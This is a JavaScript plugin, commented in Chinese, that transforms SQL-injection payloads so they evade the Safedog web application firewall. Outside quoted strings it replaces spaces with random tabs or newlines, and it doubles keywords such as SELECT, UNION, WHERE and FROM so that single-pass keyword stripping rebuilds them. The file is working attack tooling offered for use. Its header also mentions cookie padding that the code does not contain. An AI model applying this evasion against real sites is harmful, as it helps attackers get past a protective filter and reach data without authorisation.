// safedog.js — 针对 安全狗 (Safedog) WAF 的绕过插件
// 策略：tab+newline 混合替代空格 + 假 cookie 填充 + 关键字双写
export const safedog = {
  name: 'safedog',
  description: '针对 安全狗 WAF：tab+newline 混合空格 + 关键字双写（SELECT→SELSELECTECT）',
  transform(payload, ctx) {
    let s = String(payload ?? '');
    // 1) 空格 → \t 或 \n 随机
    let inQuote = false;
    let quoteChar = '';
    const chars = [];
    for (let i = 0; i < s.length; i++) {
      const c = s[i];
      if (inQuote) {
        chars.push(c);
        if (c === quoteChar && s[i - 1] !== '\\') inQuote = false;
      } else {
        if (c === "'" || c === '"') { inQuote = true; quoteChar = c; chars.push(c); }
        else if (c === ' ') { chars.push(Math.random() > 0.5 ? '\t' : '\n'); }
        else { chars.push(c); }
      }
    }
    s = chars.join('');
    // 2) 关键字双写（SELECT → SELSELECTECT, UNION → UNUNIONION）
    const doubleMap = { SELECT: 'SELSELECTECT', UNION: 'UNUNIONION', WHERE: 'WHWHEREERE', FROM: 'FRFROMOM' };
    for (const [kw, replacement] of Object.entries(doubleMap)) {
      const re = new RegExp(`\\b${kw}\\b`, 'gi');
      s = s.replace(re, replacement);
    }
    return s;
  },
};